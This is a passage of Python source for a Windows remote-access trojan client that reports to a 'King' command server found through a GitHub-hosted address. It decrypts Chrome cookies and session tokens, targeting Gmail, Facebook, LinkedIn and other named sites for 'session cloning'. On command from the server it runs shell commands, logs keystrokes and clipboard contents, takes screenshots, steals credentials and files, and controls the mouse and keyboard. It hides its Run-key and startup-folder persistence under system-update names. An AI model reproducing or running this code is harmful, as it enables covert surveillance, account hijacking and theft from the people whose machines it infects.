                                           if cookie_val:
                                                cookie_output.append(f"Host: {host} | Name: {name} | Value: {cookie_val}")
                                        except:
                                            continue
                                except Exception as e:
                                    # Handle cookie DB errors
                                    pass
                        finally:
                            if os.path.exists(temp_c): os.remove(temp_c)

                    if cookie_output:
                        output.append("\n--- SESSION COOKIES ---\n" + "\n".join(cookie_output))
                finally:
                    if os.path.exists(temp_db): os.remove(temp_db)

            # --- THE SESSION CLONING LOGIC ---
            cloning_output = []
            cookie_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')

            if os.path.exists(cookie_path):
                temp_c = os.path.join(os.getenv('TEMP'), f"c_shadow_{os.urandom(2).hex()}.db")
                try:
                    if safe_copy(cookie_path, temp_c):
                        try:
                            c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
                            c_cursor = c_conn.cursor()
                            # We only need the Session Cookies for high-value targets
                            c_cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%novo.co%' OR host_key LIKE '%gmail.com%'")
                            
                            all_cookies = c_cursor.fetchall()
                            c_conn.close()
                            
                            for host, name, enc_val in all_cookies:
                                if not enc_val.startswith(b'v10'): continue
                                
                                try:
                                    # Decrypt using your existing AES-GCM logic
                                    nonce = enc_val[3:15]
                                    payload = enc_val[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                    decrypted_cookie = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
                                    
                                    if decrypted_cookie:
                                        cloning_output.append(f"COOKIE | Host: {host} | Name: {name} | Value: {decrypted_cookie}")
                                except:
                                    continue
                        except Exception as e:
                            cloning_output.append(f"Cookie Error: {str(e)}")
                finally:
                    if os.path.exists(temp_c): os.remove(temp_c)

            if cloning_output:
                output.append("\n--- SESSION CLONING ---\n" + "\n".join(cloning_output))

            # --- TARGETING THE SESSION GHOST ---
            ghost_output = []
            cookie_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Profile 5', 'Network', 'Cookies')

            if os.path.exists(cookie_path):
                temp_c = os.path.join(os.getenv('TEMP'), f"c_vault_{os.urandom(2).hex()}.db")
                try:
                    if safe_copy(cookie_path, temp_c):
                        try:
                            c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
                            c_cursor = c_conn.cursor()
                            # Pulling session tokens for the targets in your list
                            c_cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook%' OR host_key LIKE '%linkedin%' OR host_key LIKE '%un.org.pk%'")
                            
                            all_ghost_cookies = c_cursor.fetchall()
                            c_conn.close()
                            
                            for host, name, enc_val in all_ghost_cookies:
                                if not enc_val.startswith(b'v10'): continue
                                
                                try:
                                    # Use the SAME decryption logic you have for passwords
                                    nonce = enc_val[3:15]
                                    payload = enc_val[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                    cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
                                    
                                    if cookie_val:
                                        ghost_output.append(f"SESSION_TOKEN | Host: {host} | Name: {name} | Value: {cookie_val}")
                                except:
                                    continue
                        except Exception as e:
                            ghost_output.append(f"Session Ghost Error: {str(e)}")
                finally:
                    if os.path.exists(temp_c): os.remove(temp_c)

            if ghost_output:
                output.append("\n--- SESSION GHOST ---\n" + "\n".join(ghost_output))

            # If the output is still empty, it means the 'logins' table is physically empty
            if not output:
                return b"System Check: DB found but the 'logins' table contains 0 entries."
                
            return "\n".join(output).encode('utf-8', errors='replace')
        except Exception as e:
            return f"Final Logic Error: {str(e)}".encode()
    except Exception as e:
        return f"Final Logic Error: {str(e)}".encode()


def extract_file_bytes(path):
    """Read a file and return bytes for exfiltration."""
    if not os.path.isfile(path):
        return None
    try:
        with open(path, 'rb') as f:
            return f.read()
    except Exception:
        return None


def _is_ip_address(host: str) -> bool:
    """Return True if the host string is a valid IPv4 or IPv6 address."""
    if not host:
        return False
    try:
        socket.inet_pton(socket.AF_INET, host)
        return True
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, host)
        return True
    except OSError:
        pass
    return False


def _parse_king_destination(raw_value: str):
    """Normalize a throne destination string into host and optional port."""
    if not raw_value:
        return None, None

    destination = raw_value.strip().splitlines()[0].strip()
    for prefix in ('http://', 'https://', 'tcp://', 'ssh://'):
        if destination.startswith(prefix):
            destination = destination[len(prefix):]
            break
    destination = destination.rstrip('/')
    if not destination:
        return None, None

    if '://' not in destination:
        destination = '//' + destination

    parsed = urlparse(destination)
    return parsed.hostname, parsed.port


def perform_persistent_handshake(sock, hwid, user, location, version):
    """Keep sending the handshake every 2 seconds until KING_ACK is received."""
    handshake_message = f"NODE_DATA|{hwid}|{user}|{location}|{version}|END_HANDSHAKE\n"
    sock.setblocking(False)
    last_send = 0

    while True:
        current_time = time.time()
        if current_time - last_send >= 2:
            try:
                sock.sendall(handshake_message.encode('utf-8'))
                print("[*] Shouting handshake (waiting for KING_ACK)...")
                last_send = current_time
            except BlockingIOError:
                # Send will retry on the next loop iteration
                pass
            except Exception as e:
                raise ConnectionError(f"Failed to send handshake: {e}")

        try:
            ack_bytes = sock.recv(1024)
            if ack_bytes == b'':
                raise ConnectionError("Connection closed before KING_ACK")

            ack_data = ack_bytes.decode('utf-8', errors='ignore')
            if "KING_ACK" in ack_data:
                print("[+] KING_ACK received! Handshake complete.")
                break
        except BlockingIOError:
            pass
        except socket.timeout:
            pass
        except Exception as e:
            raise ConnectionError(f"Handshake receive error: {e}")

        time.sleep(0.1)

    sock.setblocking(True)
    sock.settimeout(15)


def connect_to_king(king_url):
    """Persistent Shouter: Keep sending handshake until KING_ACK is received."""
    while True:
        try:
            address = king_url.strip()
            if not address or ':' not in address:
                raise ValueError("Invalid throne address format")

            host, port = address.split(':', 1)
            host = host.strip()
            port = port.strip()
            if not host or not port.isdigit():
                raise ValueError("Invalid throne host or port")

            print(f"[*] Localtonet destination from throne: {host}:{port}")
            print(f"[*] Connecting directly to Localtonet TCP: {host}:{port}")

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, int(port)))

            user = get_username()
            location = get_location()
            version = get_current_version()
            hwid = get_hwid()

            perform_persistent_handshake(s, hwid, user, location, version)

            print("[+] Connection Established - Ready for commands!")
            return s

        except Exception as e:
            try:
                s.close()
            except Exception:
                pass
            print(f"[-] King not found ({e}). Retrying in 10 seconds...")
            time.sleep(10)


def connect_direct_hub(hub_ip, port, max_retries: int = 3):
    """Connect directly to the command hub using raw TCP socket."""
    print(f"[DEBUG] connect_direct_hub called with {hub_ip}:{port}")
    for attempt in range(max_retries):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((hub_ip, port))

            user = get_username()
            location = get_location()
            version = get_current_version()
            hwid = get_hwid()

            perform_persistent_handshake(s, hwid, user, location, version)

            print(f"[+] Direct TCP connection established to hub at {hub_ip}:{port} with HWID")
            return s
        except Exception as e:
            try:
                s.close()
            except Exception:
                pass
            print(f"[-] [{attempt + 1}/{max_retries}] Connection attempt failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            print(f"[-] Direct TCP connection failed after {max_retries} attempts")
            return None


def send_heartbeat(sock):
    """Send PING every 15 seconds to keep connection alive."""
    while True:
        time.sleep(15)
        try:
            sock.send(b'PING\n')
        except Exception:
            break


def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
    """Connect to the hub and process commands."""
    while True:
        try:
            # Always prefer throne URL if available (connects via TCP to tunnel)
            use_throne = bool(github_throne_url)
            
            if use_throne:
                print(f"[*] Fetching hub address from throne: {github_throne_url}")
                king_url = get_king_url(github_throne_url)
                if king_url:
                    client = connect_to_king(king_url)
                else:
                    print(f"[-] Failed to get throne URL, trying direct connection to {hub_ip}:{port}")
                    client = connect_direct_hub(hub_ip, port) if hub_ip else None
            else:
                print(f"[*] Connecting directly to hub at {hub_ip}:{port}")
                client = connect_direct_hub(hub_ip, port) if hub_ip else None

            if not client:
                delay = random.randint(5, 15)
                print(f'[*] Retrying in {delay} seconds...')
                time.sleep(delay)
                continue
            
            print("[+] Connection Established - Ready for commands!")
            # Start heartbeat thread
            threading.Thread(target=send_heartbeat, args=(client,), daemon=True).start()

            while True:
                try:
                    # Always use raw socket recv for TCP connection
                    data = client.recv(1024)

                    if isinstance(data, bytes):
                        data = data.decode('utf-8', errors='ignore')
                    print(f"[DEBUG] Drone received: {repr(data)}")
                except socket.timeout:
                    continue
                except (socket.error, ConnectionResetError, BrokenPipeError) as e:
                    print(f'[-] Connection lost: {e}')
                    break
                except Exception as e:
                    print(f'[-] Receive error: {e}')
                    break

                if not data:
                    print('[-] Hub closed the connection.')
                    break

                for message in data.strip().splitlines():
                    command = message.strip()
                    if not command:
                        continue

                    elif command == 'STATUS_REPORT':
                        client.send(f'STATUS:{report_status()}\n'.encode())
                    elif command == 'TRIGGER_EVOLVE':
                        check_for_updates()
                        client.send(b'EVOLVE_CHECKED\nV_PULSE_EOF\n')
                    elif command == 'DESKTOP_CAPTURE':
                        capture_desktop_screenshot(client, is_websocket=False)
                    elif command == 'SCREENSHOT':
                        try:
                            from mss import mss
                            with mss() as sct:
                                # Capture and save locally first
                                temp_img = os.path.join(os.getenv('TEMP'), "v_shot.png")
                                sct.shot(output=temp_img)

                            with open(temp_img, "rb") as f:
                                img_data = f.read()

                            # Send THE HEADER: Type|Size|Name
                            header = f"DATA_HEADER|SCREENSHOT|{len(img_data)}|snap_{int(time.time())}.png\n"
                            client.send(header.encode() + img_data + b"V_PULSE_EOF")

                            # Clean up
                            os.remove(temp_img)
                        except Exception as e:
                            client.send(f"DATA_HEADER|LOG|{len(str(e))}|error.txt\n{str(e)}V_PULSE_EOF".encode())
                    elif command == 'ENSURE_SERVICE_CONTINUITY':
                        ensure_service_continuity()
                        client.send(b'SERVICE_CONTINUITY_OK\nV_PULSE_EOF\n')
                    elif command == 'SHUTDOWN_NODE':
                        print('[*] Shutdown command received.')
                        return
                    elif command == 'PING':
                        client.send(b'PING_OK\nV_PULSE_EOF\n')
                    elif command.startswith('MESSAGE '):
                        # Syntax: MESSAGE "text"
                        try:
                            msg_text = command.split('"')[1]
                            import ctypes
                            ctypes.windll.user32.MessageBoxW(0, msg_text, 'System Update', 64)
                        except:
                            pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command.startswith('SHELL '):
                        # Syntax: SHELL "cmd"
                        try:
                            cmd_text = command.split('"')[1]
                            import subprocess
                            subprocess.Popen(cmd_text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        except:
                            pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command.startswith('GHOST_OPEN|') or command.startswith('open '):
                        try:
                            if command.startswith('GHOST_OPEN|'):
                                target_url = command.split('|', 1)[1]
                            else:
                                target_url = command.split(' ', 1)[1]
                            import webbrowser
                            webbrowser.open(target_url)
                        except:
                            pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command == 'GHOST_MOVE':
                        if not PYAUTOGUI_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                        else:
                            try:
                                pyautogui.moveRel(10, 0, duration=0.1)
                                pyautogui.moveRel(-10, 0, duration=0.1)
                            except Exception:
                                pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command.startswith('GHOST_TYPE|'):
                        if not PYAUTOGUI_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                        else:
                            try:
                                text = command.split('|', 1)[1]
                                pyautogui.typewrite(text)
                            except Exception:
                                pass
                        client.send(b'V_PULSE_EOF\n')
                    elif command == 'KILL_AGENT':
                        try:
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                            winreg.DeleteValue(key, 'WinManager')
                            winreg.CloseKey(key)
                        except Exception:
                            pass
                        try:
                            startup_folder = os.path.join(os.getenv('USERPROFILE') or '', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                            bat_path = os.path.join(startup_folder, 'ServiceUpdate.bat')
                            if os.path.exists(bat_path):
                                os.remove(bat_path)
                        except Exception:
                            pass
                        try:
                            target_file = os.path.join(os.getenv('APPDATA') or '', 'SystemUpdates', 'win_manager.py')
                            if os.path.exists(target_file):
                                os.remove(target_file)
                        except Exception:
                            pass
                        return
                    elif command == 'EXPLORE_DRIVES':
                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=False)
                    elif command == 'HARVEST_USER':
                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json', is_websocket=False)
                    elif command == 'NETWORK_TOPOLOGY':
                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt', is_websocket=False)
                    elif command == 'EXTRACT_CREDENTIALS':
                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=False)
                    elif command == 'GET_KEYS':
                        if not PYNPUT_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
                        else:
                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=False)
                    elif command.startswith('EXTRACT_FILE '):
                        file_path = command[13:].strip('"')
                        payload = extract_file_bytes(file_path)
                        if payload is None:
                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt', is_websocket=False)
                        else:
                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=False)
                    elif command.startswith('KEYLOG'):
                        if not PYNPUT_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
                        elif 'START' in command.upper():
                            client.send(f'KEYLOG_RESULT: {start_keylogger()}\nV_PULSE_EOF\n'.encode('utf-8'))
                        elif 'STOP' in command.upper():
                            client.send(f'KEYLOG_RESULT: {stop_keylogger()}\nV_PULSE_EOF\n'.encode('utf-8'))
                        else:
                            client.send(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\nV_PULSE_EOF\n')
                    elif command.startswith('CLIPBOARD'):
                        if not PYPERCLIP_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyperclip\nV_PULSE_EOF\n')
                        elif 'START' in command.upper():
                            client.send(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\nV_PULSE_EOF\n'.encode('utf-8'))
                        elif 'STOP' in command.upper():
                            client.send(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\nV_PULSE_EOF\n'.encode('utf-8'))
                        else:
                            client.send(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\nV_PULSE_EOF\n')
                    elif command.startswith('CLICK '):
                        if not PYAUTOGUI_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                        else:
                            try:
                                parts = command.split()
                                x = int(parts[1])
                                y = int(parts[2])
                                pyautogui.click(x, y)
                            except Exception:
                                pass
                    elif command.startswith('TYPE '):
                        if not PYAUTOGUI_AVAILABLE:
                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                        else:
                            try:
                                text = command[5:].strip('"')
                                pyautogui.typewrite(text)
                            except Exception:
                                pass
                    else:
                        pass
        except ConnectionResetError:
            print('[-] Connection reset by peer.')
        except socket.error as e:
            print(f'[-] Socket error: {e}')
        except requests.RequestException as e:
            print(f'[-] Failed to fetch King URL from GitHub: {e}')
        except Exception as exc:
            print(f'[-] Unexpected error: {exc}')
        finally:
            try:
                if client is not None:
                    client.close()
            except Exception:
                pass

        delay = random.randint(5, 15)
        print(f'[*] Retrying in {delay} seconds...')
        time.sleep(delay)


# Argument parsing uses defaults from constants, but respects environment
# overrides and explicit command line values.
def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', HUB_ADDRESS), help='IP address or hostname of the King command hub')
    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', str(HUB_PORT))), help='Port of the King command hub')
    parser.add_argument('--github-throne-url', default=os.getenv('KING_THRONE_URL', DEFAULT_GITHUB_THRONE_URL), help='GitHub raw URL to retrieve King IP from (overrides --hub-ip when present)')
    parser.add_argument('--throne-url', default=os.getenv('KING_THRONE_URL', DEFAULT_GITHUB_THRONE_URL), help='Alias for --github-throne-url')
    parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
    parser.add_argument('--detached', action='store_true', help='Run in background')
    args = parser.parse_args()
    if not args.github_throne_url and args.throne_url:
        args.github_throne_url = args.throne_url
    return args


def get_king_url(github_throne_url=DEFAULT_GITHUB_THRONE_URL):
    """Pull the fresh King URL from GitHub throne."""
    if not github_throne_url:
        return None

    try:
        response = requests.get(github_throne_url, timeout=10, headers={
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        })
        address = response.text.strip()
        print(f"[*] Fetched throne address: '{address}'")
        return address
    except Exception as e:
        print(f'[-] Failed to fetch King URL from throne: {e}')
        return None


def main_loop(hub_ip, port, github_throne_url):
    """Keep reconnecting to the King if the session drops."""
    while True:
        try:
            connect_to_hub(hub_ip, port, github_throne_url)
        except Exception as e:
            print(f'[-] Connection lost. Retrying in 30 seconds...')
        time.sleep(30)


if __name__ == '__main__':
    args = parse_args()
    silent_bootstrap()
    if not args.detached:
        run_detached()
    if not args.no_persist:
        target_file = establish_persistence()
        threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
        ensure_service_continuity()
    print('\n============================================================')
    print(' Agent Node Client')
    print('------------------------------------------------------------')
    print(f'Hub IP:    {args.hub_ip}')
    print(f'Hub Port:  {args.hub_port}')
    print(f'Python:    {platform.python_version()}')
    print(f'Platform:  {platform.system()} {platform.release()}')
    print(f'MSS:       {"available" if MSS_AVAILABLE else "missing"}')
    print(f'PIL:       {"available" if PIL_AVAILABLE else "missing"}')
    print('============================================================\n')
    if args.github_throne_url:
        print(f'[*] Using GitHub throne to resolve King domain: {args.github_throne_url}')
    else:
        print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')

    # Start auto-update monitor
    threading.Thread(target=auto_update_monitor, daemon=True).start()

    main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
